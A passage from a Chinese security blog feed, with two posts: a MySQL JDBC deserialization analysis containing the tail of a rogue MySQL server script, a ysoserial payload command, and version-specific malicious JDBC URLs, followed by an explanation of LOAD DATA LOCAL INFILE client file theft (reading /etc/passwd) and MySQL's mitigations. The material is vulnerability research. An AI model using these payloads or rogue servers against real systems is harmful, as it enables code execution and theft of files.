_payload=<span class="string">'01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">"show warnings"</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"set names"</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"set character_set_results"</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"show session status"</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">'0100000102'</span></span><br><span class="line">                mysql_data += <span class="string">'1a000002036465660001630163016301630c3f00ffff0000fc9000000000'</span></span><br><span class="line">                mysql_data += <span class="string">'1a000003036465660001630163016301630c3f00ffff0000fc9000000000'</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = str(hex(len(payload_content)//<span class="number">2</span>)).replace(<span class="string">'0x'</span>, <span class="string">''</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = str(hex(len(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">'0x'</span>, <span class="string">''</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">'04'</span> + <span class="string">'fbfc'</span>+ payload_length_hex</span><br><span class="line">                mysql_data += str(payload_content)</span><br><span class="line">                mysql_data += <span class="string">'07000005fe000022000100'</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"show warnings"</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    HOST =<span class="string">'0.0.0.0'</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"start fake mysql server listening on &#123;&#125;:&#123;&#125;"</span>.format(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>Demo代码，假设JDBC连接地址可控，并在环境中添加mysql-connector-java-8.0.13和commons-collections-3.2.1依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">        String jdbc_url = <span class="string">"jdbc:mysql://x.x.x.x:3306/test?"</span> +</span><br><span class="line">                <span class="string">"autoDeserialize=true"</span> +</span><br><span class="line">                <span class="string">"&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时JDBC连接设置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>queryInterceptors：一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）；</li><li>autoDeserialize：自动检测与反序列化存在BLOB字段中的对象；</li></ul><p>先使用ysoserial生成CC7的payload，然后运行恶意MySQL服务器进行监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 calc &gt; payload</span><br><span class="line">python3 evil_mysql.py</span><br></pre></td></tr></table></figure><p>运行成功触发：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/1.png" alt=""></p><p>看到恶意MySQL服务是有具体的接受发送报文信息的：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/2.png" alt=""></p><h3 id="各种payload小结"><a href="#各种payload小结" class="headerlink" title="各种payload小结"></a>各种payload小结</h3><h4 id="ServerStatusDiffInterceptor触发点"><a href="#ServerStatusDiffInterceptor触发点" class="headerlink" title="ServerStatusDiffInterceptor触发点"></a>ServerStatusDiffInterceptor触发点</h4><h5 id="8-x"><a href="#8-x" class="headerlink" title="8.x"></a>8.x</h5><p>如上述Demo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><h5 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h5><p>属性名不同，queryInterceptors换为statementInterceptors：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><h5 id="gt-5-1-11"><a href="#gt-5-1-11" class="headerlink" title="&gt;=5.1.11"></a>&gt;=5.1.11</h5><p>包名中没有cj：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><h5 id="5-x-lt-5-1-10"><a href="#5-x-lt-5-1-10" class="headerlink" title="5.x &lt;= 5.1.10"></a>5.x &lt;= 5.1.10</h5><p>同上，但需要连接后执行查询。</p><h4 id="detectCustomCollations触发点"><a href="#detectCustomCollations触发点" class="headerlink" title="detectCustomCollations触发点"></a>detectCustomCollations触发点</h4><h5 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29 - 5.1.40"></a>5.1.29 - 5.1.40</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><h5 id="5-1-28-5-1-19"><a href="#5-1-28-5-1-19" class="headerlink" title="5.1.28 - 5.1.19"></a>5.1.28 - 5.1.19</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里仅分析ServerStatusDiffInterceptor触发点的漏洞场景。</p><p>在前面的代码调试分析发现，在调用com.mysql.cj.jdbc中相关函数来连接恶意MySQL服务器时，会调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数，而其中会调用readObject()函数执行反序列化操作，说明看注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    checkRowPos();</span><br><span class="line">    checkColumnBounds(columnIndex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> columnIndexMinusOne = columnIndex - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we can't completely rely on code below because primitives have default values for null (e.g. int-&gt;0)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.thisRow.getNull(columnIndexMinusOne)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Field field = <span class="keyword">this</span>.columnDefinition.getFields()[columnIndexMinusOne];</span><br><span class="line">    <span class="keyword">switch</span> (field.getMysqlType()) &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> BINARY:</span><br><span class="line">        <span class="keyword">case</span> VARBINARY:</span><br><span class="line">        <span class="keyword">case</span> TINYBLOB:</span><br><span class="line">        <span class="keyword">case</span> MEDIUMBLOB:</span><br><span class="line">        <span class="keyword">case</span> LONGBLOB:</span><br><span class="line">        <span class="keyword">case</span> BLOB:</span><br><span class="line">            <span class="comment">// 判断是否为Binary或Blob格式数据</span></span><br><span class="line">            <span class="keyword">if</span> (field.isBinary() || field.isBlob()) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] data = getBytes(columnIndex);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断autoDeserialize属性值是否为true，是的话才能进入反序列化操作的代码逻辑</span></span><br><span class="line">                <span class="comment">// 这就是为啥设置JDBC连接时需要带上autoDeserialize=true的原因</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) &#123;</span><br><span class="line">                    Object obj = data;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// -84和-19为序列化对象的前两个字节，即AC和ED</span></span><br><span class="line">                    <span class="keyword">if</span> ((data != <span class="keyword">null</span>) &amp;&amp; (data.length &gt;= <span class="number">2</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((data[<span class="number">0</span>] == -<span class="number">84</span>) &amp;&amp; (data[<span class="number">1</span>] == -<span class="number">19</span>)) &#123;</span><br><span class="line">                            <span class="comment">// Serialized object?</span></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ByteArrayInputStream bytesIn = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">                                ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(bytesIn);</span><br><span class="line">                                obj = objIn.readObject();</span><br><span class="line">                                objIn.close();</span><br><span class="line">                                bytesIn.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">"ResultSet.Class_not_found___91"</span>) + cnfe.toString()</span><br><span class="line">                                        + Messages.getString(<span class="string">"ResultSet._while_reading_serialized_object_92"</span>), getExceptionInterceptor());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                                obj = data; <span class="comment">// not serialized?</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> getString(columnIndex);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> getBytes(columnIndex);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面调试看下怎么调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数的，只看关键点。</p><p>一开始是com.mysql.jdbc.Driver进行JDBC中的连接，其中会新建连接实例：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/3.png" alt=""></p><p>连接后，接着设置对应的查询拦截器，对应的值就是我们在JDBC中设置的ServerStatusDiffInterceptor：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/4.png" alt=""></p><p>往下，程序从MySQL服务端来初始化Properties并执行相关的SQL语句，其中判断如果查询拦截器不为空则调用查询拦截器的preProcess()函数：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/5.png" alt=""></p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/6.png" alt=""></p><p>跟进看到，会运行查询语句<code>SHOW SESSION STATUS</code>，然后调用ResultSetUtil.resultSetToMap()函数，该函数中就调用了触发反序列化漏洞的getObject()函数（注意columnIndex为2处才能走到反序列化的代码逻辑，因为为1则直接返回null）：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/7.png" alt=""></p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/8.png" alt=""></p><p>在调用getObject()函数中，判断MySQL的类型为BLOB后，就从MySQL服务端中获取对应的字节码数据：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/9.png" alt=""></p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/10.png" alt=""></p><p>从MySQL服务端获取到字节码数据后，判断autoDeserialize是否为true、字节码数据是否为序列化对象等，最后调用readObject()触发反序列化漏洞：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/11.png" alt=""></p><p>也就是说，当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。</p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getObject:1326, ResultSetImpl (com.mysql.cj.jdbc.result)</span><br><span class="line">resultSetToMap:46, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br><span class="line">populateMapWithSessionStatusValues:87, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:105, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:76, NoSubInterceptorWrapper (com.mysql.cj)</span><br><span class="line">invokeQueryInterceptorsPre:1137, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryPacket:963, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryString:914, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">execSQL:1150, NativeSession (com.mysql.cj)</span><br><span class="line">setAutoCommit:2064, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">handleAutoCommitDefaults:1382, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">initializePropsFromServer:1327, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:966, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:825, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:455, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:240, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:207, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:664, DriverManager (java.sql)</span><br><span class="line">getConnection:247, DriverManager (java.sql)</span><br><span class="line">main:10, Test</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>MySQL JDBC客户端在开始连接MySQL服务端时，会执行一些如<code>set autocommit=1</code>等SQL Query，其中会触发我们所配置的queryInterceptors中的preProcess()函数，在该函数逻辑中、当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="MySQL" scheme="https://www.mi1k7ea.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL客户端任意文件读取</title>
    <link href="https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>https://www.mi1k7ea.com/2021/04/23/MySQL客户端任意文件读取/</id>
    <published>2021-04-23T04:32:46.000Z</published>
    <updated>2021-04-24T08:27:43.822Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前学习Jackson一条Gadget的时候涉及过，HW期间又发现类似的恶意利用工具和漏洞，就再补充一些细节。</p><h2 id="0x01-MySQL客户端任意文件读取"><a href="#0x01-MySQL客户端任意文件读取" class="headerlink" title="0x01 MySQL客户端任意文件读取"></a>0x01 MySQL客户端任意文件读取</h2><h3 id="LOAD-DATA-LOCAL-INFILE"><a href="#LOAD-DATA-LOCAL-INFILE" class="headerlink" title="LOAD DATA LOCAL INFILE"></a>LOAD DATA LOCAL INFILE</h3><p>具体可参考：<a href="https://dev.mysql.com/doc/mysql-security-excerpt/5.7/en/load-data-local-security.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/mysql-security-excerpt/5.7/en/load-data-local-security.html</a></p><p>MySQL支持使用LOAD DATA LOCAL INFILE语句，即可将客户端本地的文件中的数据insert到MySQL的某张表中。</p><p>注意，还有个LOAD DATA INFILE语句，这是加载服务端的文件而非客户端的。</p><p>LOAD DATA LOCAL INFILE的工作过程大致如下：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/data.txt文件发给我；</li><li>客户端-&gt;服务端：/data.txt文件的内容；</li></ol><p>测试看下LOAD DATA LOCAL INFILE语句，用Kali作为客户端远程连接MySQL服务，然后执行如下SQL语句来将<code>/etc/passwd</code>文件中的内容插入到MySQL的users表中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/23/MySQL客户端任意文件读取/1.png" alt=""></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>上述过程存在一个问题，即客户端发送哪个文件的内容，取决于第三步即服务端响应的想要的哪个文件，如果服务端是个恶意的MySQL，那么它可以读取客户端的任意文件内容，比如读取/etc/passwd：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/etc/passwd文件发给我；</li><li>客户端-&gt;服务端：/etc/passwd文件的内容；</li></ol><p>而且，在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露。</p><p>注意：如果使用MySQL客户端直接连接的话，是需要添加<code>--enable-local-infile</code>选项的，而其他大部分MySQL客户端实现中，是默认开启的，比如allowLoadLocalInfile是MySQL的JDBC驱动的一个创建连接的配置项、用来控制是否允许从本地读取文件，默认值为True，具体的MySQL客户端实现得具体看。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击流程如下：</p><ol><li>攻击者开启伪造的恶意MySQL服务器，诱使受害者MySQL客户端访问；</li><li>受害者向恶意MySQL服务器发起请求，并尝试进行身份认证；</li><li>恶意MySQL服务器接受到受害者的连接请求后，发送正常的问候、身份验证正确并且发送LOAD DATA LOCAL INFILE语句来读取受害者客户端本地敏感文件；</li><li>受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过LOAD DATA LOCAL INFILE语句将本地文件内容发给恶意MySQL服务器；</li><li>恶意MySQL服务器接受到客户端敏感文件，Done；</li></ol><p>GitHub上恶意MySQL服务相关项目：</p><ul><li><a href="https://github.com/rmb122/rogue_mysql_server" target="_blank" rel="noopener">https://github.com/rmb122/rogue_mysql_server</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></li></ul><p>开启恶意MySQL服务后，受害者尝试使用MySQL客户端连接恶意服务端（这里metasploitable机子的MySQL版本为5.0.51a-3ubuntu5，无需添加<code>--enable-local-infile</code>选项即可成功）：</p><p><img src="/2021/04/23/MySQL客户端任意文件读取/2.png" alt=""></p><p>恶意MySQL服务端窃取到了<code>/etc/passwd</code>文件内容：</p><p><img src="/2021/04/23/MySQL客户端任意文件读取/3.png" alt=""></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>针对LOAD DATA LOCAL INFILE的安全问题，MySQL官方给出如下说明：</p><blockquote><p>为了避免连接到不受信任的服务器，客户端可以建立安全连接并通过使用<a href="https://dev.mysql.com/doc/refman/5.7/en/connection-options.html#option_general_ssl-mode" target="_blank" rel="noopener"><code>--ssl-mode=VERIFY_IDENTITY</code></a>选项和适当的CA证书进行连接来验证服务器身份 。</p><p>为避免出现<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA</code></a>问题，客户应避免使用<code>LOCAL</code>。</p><p>管理员和应用程序可以配置是否允许本地数据加载，如下所示：</p><ul><li><p>在服务器端：</p><ul><li>所述<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>系统变量控制服务器端<code>LOCAL</code> 的能力。根据 <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>设置，服务器会拒绝或允许请求本地数据加载的客户端加载本地数据。</li><li>默认情况下，它<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a> 是禁用的。要显式地使服务器拒绝或允许<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>语句（无论在构建时或运行时如何配置客户端程序和库），请在 禁用或启用的情况下启动<strong>mysqld</strong><a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>。<a 